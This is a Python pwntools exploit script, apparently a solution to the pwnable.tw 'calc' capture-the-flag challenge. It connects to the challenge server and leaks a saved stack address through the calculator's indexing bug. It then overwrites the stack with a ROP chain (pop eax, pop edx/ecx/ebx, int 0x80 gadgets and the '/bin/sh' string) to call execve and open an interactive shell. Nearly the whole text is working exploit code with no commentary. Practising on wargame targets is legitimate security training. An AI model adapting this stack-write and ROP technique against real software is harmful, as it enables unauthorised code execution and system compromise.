#!/usr/bin/env python3
# gadgets
p_eax = 0x0805C34B  # : pop eax ; ret
p_edcbx = 0x080701D0  # : pop edx ; pop ecx ; pop ebx ; ret
int0x80 = 0x08049A21  # : int 0x80

# offset
offset = ["+361", "+362", "+363", "+364", "+365", "+366", "+367", "+368", "+369"]

# payloads
payloads = [p_eax, 0x0B, p_edcbx, 0x0, 0x0, 0x0, int0x80, 0x6E69622F, 0x0068732F]

from pwn import *

elf = ELF("./calc")
# context.update(binary=elf, log_level="DEBUG")
# p = elf.process()
#gdb.attach(
#    p,
#   """
#   b *calc+152
#   """,
#)

p = remote("chall.pwnable.tw", "10100")


def leak_stack():
    p.recv(1024)
    p.sendline(b"+360")
    save_ebp = int(p.recv(1024))
    payloads[5] = save_ebp  # leak addr of /bin/sh


def rop():
    for i in range(len(payloads)):
        # print the value available on the stack
        log.info("Target: %s" % hex(payloads[i]))
        p.sendline(offset[i].encode())

        # calculate additional value
        leak = int(p.recv(1024))
        log.info("Value leak: %s" % hex(leak))
        writeAdd = payloads[i] - leak
        log.info("Write add into stack: %d" % writeAdd)

        # write
        target = "%s%+d" % (offset[i], writeAdd)
        log.info("Send: %s" % target)
        p.sendline(target.encode())
        log.success(
            "==> Succes write into stack: %s\n=============================================\n"
            % hex(int(p.recv(1024)))
        )


leak_stack()
rop()
p.send(b"\n")

p.interactive()
